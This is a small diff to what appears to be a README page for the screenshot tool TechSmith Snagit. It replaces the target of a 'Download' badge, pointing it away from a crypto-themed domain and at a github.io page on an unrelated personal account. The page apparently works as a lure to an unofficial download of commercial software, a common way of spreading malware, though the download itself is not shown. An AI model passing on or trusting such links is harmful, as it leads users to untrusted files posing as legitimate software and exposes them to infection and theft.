@@ -2,7 +2,7 @@
 
 Snagit captures screenshots and short videos with scrolling capture, presets, stamps, and simplified markup.
 
-[![Download TechSmith Snagit](https://img.shields.io/badge/Download-TechSmith_Snagit-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download TechSmith Snagit](https://img.shields.io/badge/Download-TechSmith_Snagit-blueviolet)](https://kadirdusenkalkar16734.github.io/.github/TechSmith-Snagit)
 
 ---
 
